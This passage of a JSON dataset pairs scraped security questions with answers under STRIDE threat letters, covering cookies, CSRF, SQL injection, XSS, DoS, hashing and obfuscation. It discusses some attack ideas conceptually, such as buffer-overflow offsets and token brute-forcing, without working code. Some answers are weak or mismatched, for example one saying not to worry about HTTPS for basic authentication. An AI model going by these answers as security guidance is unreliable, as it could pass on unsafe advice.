    "Attack": " I'm using SSL to transmit all data. HTTP is completely disabled. Short of malware, or accessing someones physical machine (both of which are very hard to prevent from server side), I don't see how an attacker could steal a login cookie. ",
    "Mitigation": " You do need to ensure that you have the [CODE] flag set on your cookie, because you can't generally prevent people from attempting to access your site over non-SSL. Otherwise, I believe you should be OK.  That said, I'd suggest taking reasonable precautions. For example: "
  },
  {
    "Threat": "S",
    "Attack": " Imagine if I have a password string \"123456\" allocated sequentially in memory. What if hackers are able to get hold of the password typed by the user? Is there anyway to prevent strings from being seen so clearly?Oh yes, also, if I hash the password and sent it from client to server to compare the stored database hash value, won't the hacker be able to store the same hash and replay it to gain access to the user account? Is there anyway to prevent replaying? ",
    "Mitigation": " There are numerous issues that can occur. Your best bet is to ensure that no other code can run within your process space. Since the days of virtual memory, each process gets its own virtual memory space, ideally preventing any other program from accessing and messing with the memory of other programs. There are ways to detect if your program is being debugged.  You also need to ensure that the memory you are using to store the password is never written to disk or paged out. This web site can point you in the right direction. [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " If we consider Man In the Middle Attack; Can such an attack occur if symmetric keys are used? ",
    "Mitigation": " Sure.  All you need to do is intercept the key exchange.  Then you can pass on your own (fake) key to the other end.  You intercept the messages using the key you obtained fraudulently and re-encrypt with your fake key and pass on to the other end. "
  },
  {
    "Threat": "D",
    "Attack": " If my server implements SYN Cookies to avoid DoS attacks, but an attacker knows the server utilizes SYN Cookies, is it possible that they could create half/fully open connection simply by sending an ACK? ",
    "Mitigation": " No, it should not be possible for an attacker to know what the SYN initial sequence value is in order to complete the TCP 3 way handshake.  Further more it is not possible for any tcp port to be in a half-open state when they are using SYN Cookies.  The answer is rooted in cryptography.  "
  },
  {
    "Threat": "D",
    "Attack": " Just to give a background for my question, I am using [LINK] for a website I run. Vanilla Forums comes with baked-in support for using reCAPTCHA to authenticate new registrations on the website, which I have enabled. Recently on my forum, however, I have seen a spike in spam registrations (obvious 'spammy' usernames, same email address used, et al.) ",
    "Mitigation": "   On the verification word, reCAPTCHA  intentionally allows an \"off by one\"  error depending on how much we trust  the user giving the solution. This  increases the user experience without  impacting security. reCAPTCHA  engineers monitor this functionality  for abuse. "
  },
  {
    "Threat": "I",
    "Attack": " In a couple of my tables in my SQL Server 2005 database all of my data has been erased. Is there anyway to get a log in SQL Server of all the statements that have ran in the past day? I am trying to find out if someone did this on accident, there is a vulnerability in my web app, or the actual DB has been compromised.  ",
    "Mitigation": " See the following there are a couple of programs which will allow you to read the log.  [LINK] "
  },
  {
    "Threat": "S",
    "Attack": " Inside one of my controllers, I write the following to protect certain pages from CSRF.  The problem is that this security token appears to be missing from the forms on the pages with CSRF protection enabled, even though CSRF is indeed not effective against them.  Note, this code is from a [LINK], in which one of the objectives is to perform a clickjacking attack to bypass the CSRF project. The question I am asking here is orthogonal to the purpose of the assignment.  I am simply curious about exactly how Rails does CSRF.  The CSRF token is stored in the user's session (which is in a cookie by default, in Rails; encrypted cookie in Rails 4). It is additionally written into the page as both a [CODE] tag (for use by Javascript libraries) via the [CODE] helper method, and in a hidden field in any forms generated by [CODE] or [CODE] in the page.  Looking at this project, the reason the CSRF token doesn't appear is that the HTML is written with a literal [CODE] tag, rather than the [CODE] helper, which would include the CSRF token. Additionally, the [CODE] helper is not present in the layout, which is why the meta tag doesn't get written.  The form is hardcoded to post to [CODE] which should not be protected by CSRF protections, so this form should be CSRF-able, even though the view is marked as [CODE]. The [CODE] method isn't likely to accept even legitimate requests, since the authenticity token is never sent.  I suspect the instructors missed this, since the test would be to use the form legitimately (hitting the unverified endpoint, and letting it succeed), and then the student is instructed to attempt to CSRF against the protected endpoint (which will never pass muster anyway), so you end up testing two different things that produce the right results for the wrong reasons. ",
    "Mitigation": " Looking at this project, the reason the CSRF token doesn't appear is that the HTML is written with a literal [CODE] tag, rather than the [CODE] helper, which would include the CSRF token. Additionally, the [CODE] helper is not present in the layout, which is why the meta tag doesn't get written.  I suspect the instructors missed this, since the test would be to use the form legitimately (hitting the unverified endpoint, and letting it succeed), and then the student is instructed to attempt to CSRF against the protected endpoint (which will never pass muster anyway), so you end up testing two different things that produce the right results for the wrong reasons. "
  },
  {
    "Threat": "I",
    "Attack": " How easy/hard is it for someone who has full access to the system (like the sysadmin or hacker that hacks the sysadmin) to decrypt the source? I don't know how encryption software work, but I'm assuming they use some key, which would have to stay on the server and is therefore accessible to a sysadmin or a hacker. If you're technically-knowledgeable about the how-to, don't hesitate to offer an explanation in your answer.Does the use of such source encryption slow down the site? If anyone has first-hand experience or knows from someone that has first-hand experience ;) ",
    "Mitigation": " Encryption (or encoder) schemes try to hide your code as an encrypted file.  Obviously, the code has to be decrypted at execution time, which adds useless overhead. Some of these also insist that the host system install special routines, which the hosters intensely dislike, because they don't want to set up special configurations just for you. But the bad part is that they contain the seeds of their own undoing: to run on the target host, they must contain the decryption software.  So if you use one, you deliver the very decryptor necessary to get at your code.  Its only a matter of locating it; once found, your code is completely decryptable and exposed.    These simply aren't safe.  Obfuscation schemes scramble the names of identifiers, remove comments and formatting.  But the obfuscated code runs exactly like the original, with no overhead and no special runtime support needed.  Obfuscators depend on the inherent difficulty in understanding programs in general. Programs are hard enough to understand when they are well designed, names are well chosen, and there are good comments in the code.   We all hope our programs are well designed, but if the names are bad and the comments are gone, they're pretty hard to understand.  Examine your own experience with other people's code. "
  },
  {
    "Threat": "",
    "Attack": " Is this a security issue?  If the attacker is able to synchronize the clocks with the server to a degree of accuracy they could brute force the token.  1sec synchronization will only require 1,000,000 tries and this is not too crazy of an issue. ",
    "Mitigation": " Yes it is a security issue!  Generating tokens with time is a very bad practice.  [LINK] makes it trivial for an attacker to brute force tokens that are predictable, and tokens based on time are very predictable.  Burp allows someone to easily gather tokens and perform statistical analysis on them to determine entropy.  Using this info you can easily predict future tokens.   "
  },
  {
    "Threat": "T",
    "Attack": " In the intent of preventing XSS attacks, I am updating a page in which we have a textbox that accepts HTML, stores it in a database and retrieves and renders it at a later time. ",
    "Mitigation": " You should be set.  Though obviously this won't protect you from anything already in the database.  You could use [CODE] while outputting the page instead of when saving.  But doing when saving is probably safer.  You would not want to do it both while rendering and saving though. "
  },
  {
    "Threat": "T",
    "Attack": " But, something gives me pause. Javascript guru Douglas Crockford, in \"Javascript: The Good Parts\" and elsewhere, repeatedly refers to fake-privacy as a \"security\" issue. [LINK], \"an attacker can easily access the fields directly and replace the methods with his own\". ",
    "Mitigation": " It seems the answer is \"No, fake privacy is fine\". Here are some elaborations:  For my part, I will keep using fake privacy: A leading underscore (or whatever) indicates to myself and my collaborators that some property or method is not part of the publicly-supported interface of a module. My fake-privacy code is more readable (IMO), and I have more freedom in structuring it (e.g. a closure cannot span two files), and I can access those fake-private variables while I debug and experiment. I'm not going to worry that these programs are somehow more insecure than any other javascript program. "
  },
  {
    "Threat": "D",
    "Attack": " I would like to prevent dos attacks so what I have done is somthing like this: ",
    "Mitigation": " Block/detect DOS attacks at a lower level or via a firewall, which I'm sure many software and hardware versions support some basic types of DOS detection and prevention. "
  },
  {
    "Threat": "T",
    "Attack": " Is there still an injection risk when using prepared statements and mysqli_stmt_bind_param?   It uses the C API, so in this case there is no chance for SQL injection. ",
    "Mitigation": " It uses the C API, so in this case there is no chance for SQL injection. "
  },
  {
    "Threat": "I",
    "Attack": " If I were to leave a SHA2 family hash out on my website - how long would it be considered safe? How long would I have before I could be sure that someone would find a collision for it and know what was hashed?  Since many of us run web-servers we constantly have to be prepared for the day when someone might make it all the way to the database which stores the user hashes. So, move the server security out of the way and then what do you have? ",
    "Mitigation": " There are two ways to try to find a preimage for a given hash value: exploit a weakness of the hash function, or guess the input by trying out candidates. "
  },
  {
    "Threat": "T",
    "Attack": " I am concerned that malicious code could get executed if I do not properly validate the contents of the POST payload before attempting to create a thumbnail.  The basic workflow I have thus far is below. Is there enough validation that I do not need to be concerned about security? I guess I am worried about someone encoding something bad, then when one of the image functions below is called, the internet explodes. ",
    "Mitigation": " I ended up taking the decoded image data, and giving it to [CODE], then saving the image to a temp directory via [CODE].  Another thing I changed, was instead of using a filename based on a static string and [CODE], I used a hash. "
  },
  {
    "Threat": "T",
    "Attack": " I'm worried about a scenario where someone decompiles my code, modifies it to exploit/attack the server, re-compiles, and fires it up. ",
    "Mitigation": " I'm here to bring you the bad news. You cannot stop this.   I dug into this deeply one time. At the lowest levels in the JVM the Classloader must get an unencrypted byte stream that is the class file. You cannot change that short of replacing the JVM with your own code. Furthermore, there is a hook there that allows the byte stream to be viewed (copied, etc.). No matter what you do at higher levels, the JVM will always get to this point and allow access to your class file. Once the class file is obtained it can be decompiled. Obfuscation techniques and tools can slow that down or make it difficult, but they also cannot stop it.  I would strongly suggest that you protect your server using tried and true security methods. Don't embed the secret sauce in something you give to the client. They will get at it somehow if they are determined enough.  "
  },
  {
    "Threat": "T",
    "Attack": " The methodology for grabbing the favicon would be checking for the favicon.ico file on the target server.  Would displaying that icon as an image open any hole?  Could there be some sort of malicious favicon?  Would converting the image server-side to a different file format negate risk? ",
    "Mitigation": " However, to protect the privacy of your users, you should cache the favicon at your server, and let users' browsers fetch it from there. On the other hand, some sites might feel you've violated their intellectual property by displaying their favicon on your site. Again, I probably wouldn't worry about it too much until they ask you to stop. "
  },
  {
    "Threat": "I",
    "Attack": " What I don't get is how malware that use this technique can always get these two things right. It seems to me that in order to craft a working payload, the attacker has to know the approximate address of the target buffer and its approximate distance from the return address.  Are these two usually pretty deterministic? For example, if the attacker does a few sessions of trial and error until it works on his machine, will that same payload work on all other machines with the exact same binaries? ",
    "Mitigation": " The accuracy of determining the layout of memory is entirely dependent on the function's stack frame that you are corrupting.  Sometimes offsets can be very accurate and even a nop sled isn't required,  but its a good idea to have one anyway.   If you trigger the issue a couple of times in a debugger you can get an idea of how chaotic the stack is.  Other factors can influence very the size of the offset.  For instance if the offset can change for different versions of the program, such as an exploit written for [LINK]. Differing language distributions of the application can also affect the size of the offset.  "
  },
  {
    "Threat": "T",
    "Attack": " Is it possible for a malicious class to use this trick to break the security of the JVM, and get up to tricks that it shouldn't? Are there places in the JDK, for instance, where a [CODE] is returned from a method, and it's safe only on the assumption that it can't be changed?  If defensive cloning is all about not really knowing what a method might do to the things we pass it, and if what we're passing it is mutable, then we ought to clone it. If the code might be malicious, then it might alter a [CODE]; so whenever it's important that the [CODE] stay unchanged, we should make sure we send a copy rather than the real thing. ",
    "Mitigation": " There is a security setting that can be enabled for your Java program.  According to the [LINK],First, if there is a security manager, its checkPermission method is called with a ReflectPermission(&quot;suppressAccessChecks&quot;) permission.A SecurityException is raised if flag is true but accessibility of this object may not be changed (for example, if this element object is a Constructor object for the class Class).A SecurityException is raised if this object is a Constructor object for the class java.lang.Class, and flag is true.So, with a [CODE] that doesn't allow this check, you can prevent any code from successfully calling [CODE], preserving the immutability of [CODE]s. "
  },
  {
    "Threat": "S",
    "Attack": " [LINK] is a very serious problem that we face. However, banks are the biggest targets.  What methods can a bank use to protect its self from phishing attacks? What methods should someone use to protect themselves.   Why does it stop attacks?   The best way to prevent phishing attacks should rely on technical means that don't require the user to understand the problem. The target audience will always be large enough to find someone who gets fooled.  The reason that this is not widely implemented is probably that it is still more cost-effective for banks to pay for the damage from phishing attacks than investing in security. ",
    "Mitigation": " A good way to prevent from attacks is to use an authentication mechanism that doesn't rely on a simple pass phrase or transaction authentication number ([LINK]) that an attacker can steal.   Existing methods e.g. use dynamic TANs (Indexed TAN or [LINK]), or a TAN submitted on a separate channel via SMS (mobile TAN or [LINK]), or - most secure and also preventing from real-time man-in-the-middle attacks - require the user to sign each transaction, e.g. using [LINK] or a smartcard. "
  },
  {
    "Threat": "E",
    "Attack": " 2) The domain model is, in a way, the place where \"the buck stops here.\"  If I implement security in the domain model, then I know that even if security in another layer fails, the domain model should catch it.  ",
    "Mitigation": " Personally, I find this concern seems to belong in the service layer.  Presumably, the application will persist through the service layer to one degree or another in order to reach the domain, and you could easily have a non-domain service to verify the user's role prior to the commit. "
  },
  {
    "Threat": "I",
    "Attack": " I am using Proguard but even then, I cannot guarantee that a determined hacker wouldn't be able to exploit my API Secret. Do established apps like Quora also expose these keys? ",
    "Mitigation": " Proguard will not obfuscate string literals. Instead you could store the secret as an encrypted string (maybe using AES) and decrypt when required. Alternatively, commercial programs such as [LINK]  or [LINK] provide string obfuscation. "
  },
  {
    "Threat": "T",
    "Attack": " One thing that really threw me for a loop is that one could flip a bit in an encrypted cookie and actually have a meaningful change in the contained data.  ",
    "Mitigation": " Simply set the [LINK] method to [CODE].  Another method is to store a completely random, cryptographically secure generated string and set that as the cookie value. On your server, store it hashed with SHA-2 (no need for salt) and lookup this value to retrieve details about the user's session. Of course this has some more overhead. The advantage is that sessions can be killed server side by deleting the entry.  This can be done with Forms Authentication too, however you would need to implement a custom provider. "
  },
  {
    "Threat": "T",
    "Attack": " I've heard it claimed that the simplest solution to preventing SQL injection attacks is to html encode all text before inserting into the database.  Then, obviously, decode all text when extracting it.  The idea being that if the text only contains ampersands, semi-colons and alphanumerics then you can't do anything malicious.  It claims to be a silver bullet.  Potentially stopping users of this technique from understanding all the possible related issues - such as second-order attacks.It doesn't necessarily prevent any second-order / delayed payload attacks.It's using a tool for a purpose other than that which it was designed for.  This may lead to confusion amongst future users/developers/maintainers of the code.  It's also likley to be far from optimal in performance of effect.It adds a potential performance hit to every read and write of the database.It makes the data harder to read directly from the database.It increases the size of the data on disk. (Each character now being ~5 characters - In turn this may also impact disk space requirements, data paging, size of indexes and performance of indexes and more?)There are potential issues with high range unicode characters and combining characters?Some html [en|de]coding routines/libraries behave slightly differently (e.g. Some encode an apostrophe and some don't. There may be more differences.)  This then ties the data to the code used to read &amp; write it. If using code which [en|de]codes differently the data may be changed/corrupted.It potentially makes it harder to work with (or at least debug) any text which is already similarly encoded.  Is there anything I'm missing?Is this actually a reasonable approach to the problem of preventing SQL injection attacks?Are there any fundamental problems with trying to prevent injection attacks in this way? ",
    "Mitigation": " You should prevent sql injection by using parameter bindings (eg. never concatenate your sql strings with user input, but use place holders for your parameters and let the framework you use do the right escaping). Html encoding, on the other hand, should be used to prevent cross-site scripting. "
  },
  {
    "Threat": "S",
    "Attack": " How can I detect if my php script is being called from another domain and the other domain is making illegal use of my script? Is there a way to prevent this too?   I found [LINK] question on SO, but its still not safe, it can be spoofed.  There isn't any absolutely foolproof method to prevent this, since any header information can be spoofed.  Session-based tokens are another possible solution, but in that case your javascript is publicly accessible, so anyone who wanted to spend a little time could determine how your token system works and figure out a way around it. ",
    "Mitigation": " A combination of methods will give you the most wide-ranging protection.  You can look for the header, use and .htaccess file, and use tokens.  This sort of all-of-the-above approach makes it that much harder to abuse a web server - most abuse comes from people trying to find an easy hole to exploit. The important thing to remember is that you can't become complacent because you've deployed \"the best\" protection, or because you've got so many layers of protection that it seems impossible to crack.  If someone really wanted it bad enough and had the time, they'll find a way. These types of preventative measures are really only deterrents to keep away the lazy, curious, and idly malicious. Targeted attacks are a whole separate class of security, and usually are more centered on server-level security issues. "
  },
  {
    "Threat": "T",
    "Attack": "",
    "Mitigation": " Thanks to @cremno for providing a link to the GIT repository for the file in question: [LINK] (Note that this is not the repository head.)  It's clear that this report is spurious. First, there is no real problem with the [CODE] call, although you can argue that code in a security-related product like OpenSSL needs to go beyond being secure to the point of being visibly secure even to a casual glance. (I'm not sure I would make that argument, but it has been made.) "
  },
  {
    "Threat": "E",
    "Attack": " I'm using UNLINK with [CODE] and [CODE]. I know that in this way is very dangerous, because everyone can delete any files. But I need to use [CODE] because I can't reload the page when I delete the files. ",
    "Mitigation": " You need to authenticate the user somehow.  Your user needs to be authenticated with a username and a password.  PHP session can be used to remember, and you should use a database table or a text file on the server to store file ownership information.  Then, before unlinking anything, your logic should make sure that the currently \"authenticated\" user is the owner of the file. "
  },
  {
    "Threat": "T",
    "Attack": "   A JSON vulnerability allows third party website to turn your JSON resource URL into JSONP request under some conditions. To counter this your server can prefix all JSON requests with following string \")]}',\\n\". Angular will automatically strip the prefix before processing it as JSON. ",
    "Mitigation": " In order to strip the characters, you must have access to the raw content of the file.   Chrome extensions have access to that. Someone who has pointed a [CODE] at the raw file does not.  because it works ;)  Yes. When the file is treated as JavaScript, it will throw an error on line 1 before it reaches the array. This will stop it from ever trying to evaluate the array, so the overwritten Array constructor won't be able to read in the data from it.  Happily, the security problems appears to exist only in very ancient versions of Firefox, so you probably don't need to worry about this at all. "
  },
  {
    "Threat": "I",
    "Attack": " When we say dictionary attack, we don't really mean a real dictionary, do we? My guess is we mean a hacker's dictionary i.e. [LINK], right?  My point is we're not talking about someone keying different passwords into the login box, we're talking about someone who has full access to your database (which has hashed passwords, not plain passwords) and this person is reversing the hashes, right? ",
    "Mitigation": " Since passwords are oft-times the easiest-to-attack part of cryptography it's actually sort of a real dictionary. The assumption is that people are lazy and choose proper words as password or construct passphrases out of them. The dictionary can include other things, though, such as commonly used non-words or letter/number combination. Essentially everything that is likely to be a poor-chosen password.There are programs out there which will take an entire hard drive and build a dictionary out of every typable string on it on the assumption that the user's password was at some point in time put in plaintext into memory (and then into the pagefile) or that it simply exists in the corpus if text stored on the drive1:Even so, none of this might actually matter. AccessData sells another program, Forensic Toolkit, that, among other things, scans a hard drive for every printable character string. It looks in documents, in the Registry, in e-mail, in swap files, in deleted space on the hard drive ... everywhere. And it creates a dictionary from that, and feeds it into PRTK.And PRTK breaks more than 50 percent of passwords from this dictionary alone.Actually, you can make dictionaries more effective even if you include knowledge on how people usually build passwords. Schneier talks about this lengthily1:Common word dictionary: 5,000 entriesNames dictionary: 10,000 entriesComprehensive dictionary: 100,000 entriesPhonetic pattern dictionary: 1/10,000 of an exhaustive character searchThe phonetic pattern dictionary is interesting. It's not really a dictionary; it's a Markov-chain routine that generates pronounceable English-language strings of a given length. For example, PRTK can generate and test a dictionary of very pronounceable six-character strings, or just-barely pronounceable seven-character strings. They're working on generation routines for other languages.PRTK also runs a four-character-string exhaustive search. It runs the dictionaries with lowercase (the most common), initial uppercase (the second most common), all uppercase and final uppercase. It runs the dictionaries with common substitutions: &quot;$&quot; for &quot;s,&quot; &quot;@&quot; for &quot;a,&quot; &quot;1&quot; for &quot;l&quot; and so on. Anything that's &quot;leet speak&quot; is included here, like &quot;3&quot; for &quot;e.&quot;The appendage dictionaries include things like:All two-digit combinationsAll dates from 1900 to 2006All three-digit combinationsAll single symbolsAll single digit, plus single symbolAll two-symbol combinations<hr />1 Bruce Schneier: Choosing Secure Passwords. In: Schneier on Security. ([LINK]) "
  },
  {
    "Threat": "T",
    "Attack": " These cover everything that I need for formatting, and (as far as I know) don't present any security risk. Basically, the enforcement of well-formedness and the lack of any layouting styles prevent anyone to hurt the layout of the site. The disallow of the script tag and the likes prevent XSS.(One exception: maybe I should allow [CODE]/[CODE] in a predefined range for images.) ",
    "Mitigation": "   <h2>[LINK]</h2>    <h3>Problem</h3>    You want to allow untrusted users to supply HTML for output on your website (e.g. as comment submission). You need to clean this HTML to avoid [LINK] (XSS) attacks.    <h3>Solution</h3>    Use the jsoup HTML [LINK] with a configuration specified by a [LINK]. "
  },
  {
    "Threat": "E",
    "Attack": " Is the above correct or am I missing something?How does the JVM decide whether to grant or restrict access? Is the user involved in this decision?In [LINK] theres an example (figure 2) in which a frame inherits/is being told the \"belief set\" of the previous frame! What stops malicious code from being executed in this example (i.e. get access to a resource that shouldnt have accesss to)?    In this study theres an example (figure 2) in which a frame inherits/is being told the \"belief set\" of the previous frame! What stops malicious code from being executed in this example (i.e. get access to a resource that shouldnt have accesss to)? ",
    "Mitigation": " It delegates to the currently installed [CODE].  The [CODE] can introspect on the stack, or it can use some other criteria.  The [CODE] associated with applets that run in the browser does introspect so this is right in at least one domain.  Nothing really.  Java security is a mess and many recommend turning java off in browsers since few legit sites use it these days. "
  },
  {
    "Threat": "T",
    "Attack": " I'm having trouble understanding why java secure coding is important. For example, why is it important to declare variables private? I mean I get that it will make it impossible to access those variables from outside the class, but I could simply decompile the class to get the value.Similarly, defining a class as final will make it impossible to subclass this class. When would subclassing a class be dangerous for security? Again if necessary, I could decompile the original class and reimplement it with whatever malicious code I could want.Does the problem come when applications are \"trusted\" by the user? And people could then abuse this trust somehow?Basically what I'm looking for is a good example as to why secure coding guidelines should be followed. ",
    "Mitigation": " If you define strict APIs, that don't expose variables that are not supposed to be exposed (we like to call this [LINK]), you help users of your APIs, and thus make programming easier. This is considered a good thing.  The reasons are not primarily \"security\", as in keeping secret things secret, as much as clarity, simplicity, and understandability. "
  },
  {
    "Threat": "S",
    "Attack": " From what I've seen online, people typically describe basic HTTP auth as being unsecured due to the credentials being passed in plain text from the client to the server; this leaves you open to having your credentials sniffed by a nefarious person or man-in-the-middle in a network configuration where your traffic may be passing through an untrusted point of access (e.g. an open AP at a coffee shop). ",
    "Mitigation": " Start replicating now! Do not worry about HTTPS. "
  },
  {
    "Threat": "E",
    "Attack": " All I essentially need to be able to do is prevent the execution of specific methods when called from Groovy or Freemarker. I've considered a hack that would look at the call stack, but this would be a massive speed hit (and it quite messy).  ",
    "Mitigation": " You can do it by subclassing the GroovyClassLoader and enforcing your constraints within an AST Visitor. THis post explains how to do it: [LINK] "
  },
  {
    "Threat": "D",
    "Attack": " Folks, we all know that IP blacklisting doesn't work - spammers can come in through a proxy, plus, legitimate users might get affected... That said, blacklisting seems to me to be an efficient mechanism to stop a persistent attacker, given that the actual list of IP's is determined dynamically, based on application's feedback and user behavior.   For example:- someone trying to brute-force your login screen- a poorly written bot issues very strange HTTP requests to your site- a script-kiddie uses a scanner to look for vulnerabilities in your app ",
    "Mitigation": " are you on a *nix machine? this sort of thing is probably better left to the OS level, using something like [LINK]  in response to the comment, yes (sort of). however, the idea is that iptables can work independently. you can set a certain threshold to throttle (for example, block requests on port 80 TCP that exceed x requests/minute), and that is all handled transparently (ie, your application really doesn't need to know anything about it, to have dynamic blocking take place).  i would suggest the iptables method if you have full control of the box, and would prefer to let your firewall handle throttling (advantages are, you don't need to build this logic into your web app, and it can save resources as requests are dropped before they hit your webserver) "
  },
  {
    "Threat": "I",
    "Attack": " I imagine most of our eventual user base will be honest, so I don't think we have too much to worry about. On the other hand, I'd rather not have the casual cracker gain access without a good deal of sweat and tears. ",
    "Mitigation": " In my opinion, the key problem you'll face is not with your registration algorithm and level (or lack) of obfuscation.  Rather, it's this: At some point in your code it comes down to simple binary decision - to run, or to exit. Hacking your system only requires finding and tweaking this decision point.  Everything else - obfuscation, strong signing, tamper detection - is oriented to make this more difficult, but it can't make it that much harder. "
  },
  {
    "Threat": "T",
    "Attack": " My website has been taken down by hackers, and looking through the site there is a load of additional stuff at the top of each PHP file. ",
    "Mitigation": " Well, I'd say your whole server is never to be trusted again. Nuke the damn thing from orbit and re-install a backup.  Next, set chmod settings so these files cannot be edited by anyone other than an account that is NOT the web-account. You need to understand unix security.  Next, remove that damn eval from any file that runs on your server ([LINK]). If you have any running code that depends on it, you're doing it wrong anyway. Remove it. You need to.  A band-aid measure will be to block the hacker domain, but this is totally worthless past 12 hours, they can just move elsewhere, and likely have by now.  <h2>Lastly, hire someone who's a trained security expert.</h2> "
  },
  {
    "Threat": "T",
    "Attack": " I am designing an API for confidential communication between an IoT device and a client. A must is that that the client-device connection is secure and no man-in-the middle can temper the communication or attack the devices, including the routing server.  ",
    "Mitigation": " The way to do it is just to use HTTPS and certificate pinning (this is very similar to what SSH does under the hood). "
  },
  {
    "Threat": "I",
    "Attack": " Is there a \"right\" way to do this? My initial thinking is to store the credentials encrypted in some form such that they can be decrypted on the server for purposes of making API calls to the 3rd party service. This would mean that an attacker would need to understand how the encryption/decryption works in order to steal the user's external passwords. However, that does not seem so far-fetched to me; a clever hacker who had already breached the server hosting my application would probably be able to get at the code and figure it out pretty easily. ",
    "Mitigation": " IMO opinion you should not take responsibility to store the credentials somewhere on your file system. Just think that even the 3-rd party server does not know the user credentials (would have the hash of the password and not the actual password stored).I would recommend to store them as part of an http-session which lasts as long as the session is active.   "
  },
  {
    "Threat": "S",
    "Attack": " So, hashes are useful because they change password/login name/salt value combinations to a code that cannot be reversed. The client sends this hash to the server. The server compares the hash to a list of stored hashes to see if the client's user may be granted access.But how do I prevent a malicious user from intercepting the hashed password and writing his own client that sends this hash to the server? ",
    "Mitigation": " As you have pointed out they don't stop request interception ([LINK]) to stop that you need to use secure connections with packet encryption and signing. [LINK] &amp; [LINK] are the most common ways to do this. "
  },
  {
    "Threat": "I",
    "Attack": " However, a malicious user that wants your database password, could just copy the encrypted config file, use it with it's own application, and call    a malicious user that wants your database password, could just copy the encrypted config file, use it with it's own application ",
    "Mitigation": " This is a reasonably strong protection, but if we suppose that web.config could be stolen, we must also suppose that the private key file could be stolen as well. Hence, protected option is \"more secure\" only in the sense that a kid next door would have harder time breaking it.  If your RDBMS is SQL Server, you could use its [LINK] feature to avoid storing, and even creating, login credentials for the RDBMS. "
  },
  {
    "Threat": "T",
    "Attack": " tl;dr Can I execute un-trusted scripts on an iframe safely?<h3>Back story:</h3>I'm trying to [LINK]. A lot of older browsers do not support Web Workers which means that the current solution I came up with is not optimal.I figured I could create an [CODE] and load a script inside it. That script would perform a JSONP request (creating a script tag), which would post a message to the main page. The main page would get the message, execute the callback and destroy the iframe. I've managed to [LINK].[CODE]The problem is that since the iframes are on the same domain, the injected script still has access to the external scope through [CODE] or [CODE] and such.<h3>Is there any way to create an iframe that can not access data on the parent scope?</h3>I want to create an iframe where scripts added through script tags will not be able to access variables on the parent window (and the DOM). I tried stuff like [CODE] but I'm really not sure that's enough, there might be other workarounds. I tried running a for... in loop, but my function stopped working and I was unable to find out why.NOTE:I know optimally WebWorkers are a better isolated environment. I know JSONP is a &quot;bad&quot; technique (I even had [LINK] tell me he'd never use it today). I'm trying to create a secure environment for scenarios where you have to perform JSONP queries. ",
    "Mitigation": " You can't really delete the references, setting null will just silently fail and there is always a way to get the reference to the parent dom.  References like [CODE] and [CODE] etc. cannot be deleted. Attempting to do so will either silently fail or throw exception depending on browser. "
  },
  {
    "Threat": "I",
    "Attack": " The confusing thing here, is that on first API call, user has to send user name and password, so hacker still have big chance to find out user info!!! ",
    "Mitigation": " There must be a way to prove your identity to authorization server, and one way is to provide username and password. The way you're gonna achieve communication between authorization server and your client application is totally up to you as long as it uses HTTP. As stated in [LINK]:This specification is designed for use with HTTP ([RFC2616]).  Theuse of OAuth over any protocol other than HTTP is out of scope.Of course it's always advised to use HTTPS whenever possible. Just because HTTP is mentioned in document, doesn't mean HTTPS cannot be used because HTTPS is just encrypted version of HTTP.Other thing I wanted to mention is that you don't need to provide username and password, there are several grant types where you can, for example, instead of username and password you can provide client_id and client_secret which is used in Client Credentials grant type.If you are new to this I believe this all is little bit confusing for you. To summarize the purpose of OAuth2 to you (as far as I get it), is:To separate role of the client (which can be browser, mobile etc.) from the resource owner (usually the owner of account). Why? Because if there is no separation, the client has access to user's sensitive data.Imagine that the first point is secure enough for communication. But what happens if someone gets their hands on the session you have? They have access to all! This is why OAuth introduces scopes, where depending on the scope user has with provided access token has limited access to resources. Scope can be read, write, share etc. - this implementation is up to developer. So if someone gets their hands on your access token, because of scope they only have a limited access to resource.These are one of my reasons, while [LINK] has better explanation:Third-party applications are required to store the resourceowner's credentials for future use, typically a password inclear-text.Servers are required to support password authentication, despitethe security weaknesses inherent in passwords.Third-party applications gain overly broad access to the resourceowner's protected resources, leaving resource owners without anyability to restrict duration or access to a limited subset ofresources.Resource owners cannot revoke access to an individual third partywithout revoking access to all third parties, and must do so bychanging the third party's password.Compromise of any third-party application results in compromise ofthe end-user's password and all of the data protected by thatpassword.To learn more about OAuth2, it's grant types and purposes, I recommend you to read this:[LINK]Mentioned [LINK], even though it can be difficult to read because of technical writing.Hope I clarified at least a small piece of blur. "
  },
  {
    "Threat": "E",
    "Attack": " My concern is, since in this case the iframe's src is a variable I fear that a malicious user somehow manages to edit the 'rel' attribute and open an iframe that he or she wants. Is this possible? ",
    "Mitigation": " Theoretically, if the [CODE] attribute is based on a server constant, there should be no additional security issues other than the ones you can't control, such as MiTM. "
  },
  {
    "Threat": "T",
    "Attack": " And how to ensure, I mean optimize the security, in order to prevent from hackers to hack the database? ",
    "Mitigation": " Use [LINK]. For a hypothetical login you might use this, for example:  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " Now all this gets me thinking if this is a security concern. Can't I as a potential hacker inject some javascript into the user's webpage that could either <br/>a) make a [CODE] and get the access token or <br/>b) just get the access token by making a request to my api server and get the access token <br/>and then use that to post (assuming that user authorized my app to do so) to facebook as if my app was doing it? ",
    "Mitigation": " Practically, if you are worried about security - first carefully check all the facebook docs related to authentication and security and follow their recommendations. Second - search for common known attack vectors and recommendations of how to avoid security risks in your application. If the user already has malware on his computer which is able to alter browser behavior (like inject additional scripts into pages), you probably can't do much about it. "
  },
  {
    "Threat": "I",
    "Attack": " How does one safely compare two strings with bounded length in such a way that each comparison takes the same time? Hashing unfortunately has a timing attack vulnerability. ",
    "Mitigation": " TL;DR: Use assembly. "
  },
  {
    "Threat": "I",
    "Attack": " Through the years I've come across this scenario more than once. You have a bunch of user-related data that you want to send from one application to another. The second application is expected to \"trust\" this \"token\" and use the data within it. A timestamp is included in the token to prevent a theft/re-use attack. For whatever reason (let's not worry about it here) a custom solution has been chosen rather than an industry standard like SAML. ",
    "Mitigation": " Part of it depends on the Encryption Mode.  If you use ECB (shame on you!) I could swap blocks around, altering the message.  [LINK].   "
  },
  {
    "Threat": "T",
